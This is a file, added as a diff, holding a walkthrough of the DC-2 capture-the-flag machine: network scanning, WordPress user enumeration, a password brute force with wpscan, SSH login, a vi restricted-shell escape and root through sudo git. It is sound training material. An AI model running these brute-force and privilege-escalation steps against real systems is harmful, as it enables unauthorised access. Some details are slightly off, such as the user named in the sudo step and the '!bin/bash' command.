@@ -1,0 +1,82 @@
+1. -> nmap -sn 192.168.x.x/24
+   ( Let's start with a network scan to find out the IP address of target machine.)
+   
+
+2. -> vi /etc/hosts (add "192.168.x.x dc-2" to host list)
+   ( Add the domain name into our "Host file", so that we can access http services.)
+
+
+3. -> nmap -sV -A -p- 192.168.x.x
+   ( Now, we need to find out the running services on the target machine.  
+     And, from the nmap scan we found that a wordpress web is hosted over the target machine.)
+
+
+4. -> 192.168.x.x:80
+   ( Since http services are open on port 80, lets access via our system browser. There you see a flag, read it.)
+  
+
+5. -> wpscan --url http://dc-2 --enumerate u
+   ( As we know wpscan scanning tool is used for finding wordpress vulnerabilities, so we are doing a wpscan to see what the scan enumerates. As a result you'll find three users "jerry, admin, tom".)
+
+
+6. -> cewl http://dc-2 > password
+   ( Carefully read the hint given in flag-1 inside the dc-2 webpage, we are using cewl to generate a wordlist for passwords.) 
+
+
+7. -> cat > users
+   ( Create a file named users and insert all usernames found via wpscan enumeration.)
+
+
+8. -> wpscan --url http://dc-2 -U users -P password
+   ( Perform a brute force attack using wpscan. As a result you'll get passwords for tom & jerry.)
+
+9. Now, login to wordpress using credentials of either tom or jerry. You'll get the flag-2, which will be indicating to try another entry point.
+
+
+10. -> ssh tom@192.168.56.103 -p 7744
+    ( According to flag-2 we have to make entry through another way, so as we recall there is SSH service running alongside the http service. Hence make a login via SSH running on port 7744.)
+
+
+11. -> ls
+    -> cat flag3.txt
+    -> echo $PATH
+    -> ls /home/tom/usr/bin
+    ( Congrats on a successfull login but we have a restricted shell in which some commands are not found. But some commands are available.)    
+
+
+12. -> vi
+       :set shell=/bin/bash
+       :shell
+     ( Since we had a restricted shell, we found that we can use the vi editor. Therefore, we can use vi editor to escape the restricted shell.)
+
+
+13. -> export PATH=/bin:/usr/bin:$PATH
+    ->export SHELL=/bin/bash:$SHELL
+    ( After escaping the restricted shell, we export “/bin/bash” as our SHELL environment variable and “/usr/bin” as our PATH environment variable so that we can run Linux commands properly.)
+
+
+14. -> ls
+    -> cat flag3.txt
+    ( After that, we try to open flag3.txt again using cat command and luckily found next hint to move ahead.)
+
+
+15. -> su jerry
+    ( Switched to user jerry according to hint given in flag-3.)
+
+
+16. -> sudo -l
+    ( Checked the sudoers list and found that tom can run “/usr/bin/git” as root without a password.)
+
+
+17. -> sudo git help add
+    ( Having the root permission on git was like the cherry on the cake, because through this I can try to escalate low privilege shell to high privilege shell.)
+
+
+18. -> !bin/bash
+    ( For spawning root shell type.)
+
+
+19. -> cd /root
+    -> ls 
+    -> cat final_flag.txt
+    ( Atlast we got the root access, then we switched to the root directory and found our final_flag.)
